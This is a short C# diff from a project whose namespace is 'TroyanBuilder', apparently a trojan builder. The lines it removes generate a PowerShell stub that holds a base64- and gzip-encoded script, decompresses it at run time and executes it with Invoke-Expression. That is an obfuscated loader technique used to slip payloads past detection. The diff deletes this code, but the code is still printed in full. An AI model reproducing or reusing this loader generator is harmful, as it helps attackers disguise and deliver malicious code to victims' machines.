@@ -52,32 +52,5 @@ namespace TroyanBuilder
 
             return customBase64.ToString();
         }
-
-
-
-        public static string GeneratePowerShellScript(string powerShellCode)
-        {
-            var encoded = Encode(powerShellCode);
-            return $"""
-$EncodedScript = "{encoded}"
-
-    $CompressedBytes = [Convert]::FromBase64String($EncodedScript)
-    $MemoryStream = New-Object System.IO.MemoryStream(, $CompressedBytes)
-    $GzipStream = New-Object System.IO.Compression.GzipStream($MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)
-    $StreamReader = New-Object System.IO.StreamReader($GzipStream, [System.Text.Encoding]::UTF8)
-    $data = $StreamReader.ReadToEnd()
-    $DecodedScript = "`$EncodedScript = '$EncodedScript'" +  [Environment]::NewLine + $data
-    Invoke-Expression $DecodedScript
-
-""";
-        }
-
-
-        public static void GeneratePowerShellScript(string inFile, string outFile)
-        {
-            var data = File.ReadAllText(inFile);
-            data = GeneratePowerShellScript(data);
-            System.IO.File.WriteAllText(outFile, data);
-        }
     }
 }
